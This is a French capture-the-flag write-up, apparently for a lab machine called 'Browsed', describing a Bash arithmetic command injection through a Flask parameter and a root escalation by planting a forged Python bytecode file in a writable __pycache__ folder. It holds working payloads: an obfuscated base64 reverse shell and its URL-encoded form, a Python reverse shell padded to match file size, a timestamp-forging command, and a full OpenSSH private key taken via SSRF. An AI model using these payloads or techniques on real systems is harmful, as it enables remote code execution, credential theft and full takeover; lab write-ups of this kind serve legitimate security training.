---
aliases:
  - Browsed
---
![[IMG-20260111125221658.png]]

![[IMG-20260111132014096.png]]

![[IMG-20260114014511658.png]]

![[IMG-20260115002645465.png]]

### Ce que montre le code

Sur ce premier screenshot, on voit la route Flask suivante :

![[IMG-20260115002700446.png]]

### Ce qui est important à expliquer

**Le paramètre `rid` est entièrement contrôlé par l’utilisateur**  
Il est **passé tel quel** en argument à un script Bash  
Aucune validation, aucun filtrage, aucune conversion en entier

**La surface d’attaque n’est donc pas Python, mais Bash.**

### Ce que montre le script

Dans le second screenshot, on observe la logique du script `routines.sh` :

![[IMG-20260115002732252.png]]

À première vue, le script semble sûr :

- il compare `$1` à des valeurs numériques
- il ne fait pas d’`eval`
- il ne fait pas d’`exec`
 **Mais c’est trompeur.**
Le vrai problème : `[[ "$1" -eq 0 ]]`
L’opérateur `-eq` force Bash à traiter l’expression comme **arithmétique**.
Or, en Bash :
- certaines syntaxes (comme les index de tableaux) **déclenchent une évaluation**
- cette évaluation **autorise la substitution de commande `$(...)`**
### Le comportement dangereux
Avec une entrée comme :
`a[$(id)]`
Bash évalue :
1. l’expression arithmétique
2. l’index du tableau
3. **exécute `$(id)`**
4. puis échoue sur la comparaison

**La commande est exécutée avant l’erreur**

ATTENTION:
Si l’on fournit simplement :
`$(id)`
l’expression devient :
`[[ "$(id)" -eq 0 ]]`
Dans ce cas, Bash **n’entre pas dans une véritable évaluation arithmétique**.  
Il tente uniquement de convertir la chaîne `"$(id)"` en entier afin d’effectuer la comparaison numérique.  
Comme la chaîne n’est pas un nombre valide, Bash échoue immédiatement avec une erreur de type _operand expected_, **sans jamais exécuter la substitution de commande**.

Payload:
![[IMG-20260115004105079.png]]

```bash
a[$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy4xMzIvNDQ0NCAwPiYxCg== | base64 -d | bash)]
```

URL ENCODE:

```bash
a%5B%24%28echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNy4xMzIvNDQ0NCAwPiYxCg%3D%3D%20%7C%20base64%20%2Dd%20%7C%20bash%29%5D%0A
```

SSRF depuis le site principal:
![[IMG-20260115004345840.png]]
![[IMG-20260115004400334.png]]

![[IMG-20260115004424242.png]]

![[IMG-20260115004437383.png]]
clé SSH:
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDZZIZPBRF8FzQjntOnbdwYiSLYtJ2VkBwQAS8vIKtzrwAAAJAXb7KHF2+y
hwAAAAtzc2gtZWQyNTUxOQAAACDZZIZPBRF8FzQjntOnbdwYiSLYtJ2VkBwQAS8vIKtzrw
AAAEBRIok98/uzbzLs/MWsrygG9zTsVa9GePjT52KjU6LoJdlkhk8FEXwXNCOe06dt3BiJ
Iti0nZWQHBABLy8gq3OvAAAADWxhcnJ5QGJyb3dzZWQ=
-----END OPENSSH PRIVATE KEY-----
```

![[IMG-20260115004512846.png]]

## Privesc:

![[IMG-20260115132148521.png]]
On peut exécuter un script python en root qui télécharge des module dans extension_utils.py
On observer aussi que le dossier __pycache__ est writable. 
`__pycache__` est un répertoire utilisé par Python pour stocker les fichiers **bytecode compilés** (`.pyc`).  
Lorsqu’un module Python est importé, Python le compile en bytecode afin d’accélérer les imports suivants, puis enregistre ce bytecode dans `__pycache__`.
https://realpython.com/python-pycache/
![[IMG-20260115152236768.png]]


Lors d’un import ultérieur, **si un fichier `.pyc` valide est présent**, Python peut l’exécuter directement **sans relire le fichier source `.py`**, à condition que ses métadonnées internes (timestamp et taille du fichier source) correspondent.
Voici les metadonné du fichiers extension_utils.py:
![[IMG-20260115133043277.png]]
Il faut donc créer une copie du fichier avec un poc à l'interieur en faisant attention que sa taille et sa date soit la meme que le vrai extension_utils:
Voici le code de la copie:
```
import os
os.system("bash -c 'bash -i >& /dev/tcp/10.10.16.33/4444 0>&1'")

#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

On utilise cette commande pour changer la date:
```
touch -d "2025-03-23 10:56:19" extension_utils.py
```

![[IMG-20260115133418694.png]]

Notre copie à maintenant la même date et la même taille que le vrai extension_utils.py
On compile ensuite notre fichier et on le copie dans `__pycache__`
![[IMG-20260115133643808.png]]
On execute le script en root et on obtient un shell root sur notre machine.
![[IMG-20260115133726301.png]]

![[IMG-20260115133827978.png]]

![[IMG-20260115131054327.png]]
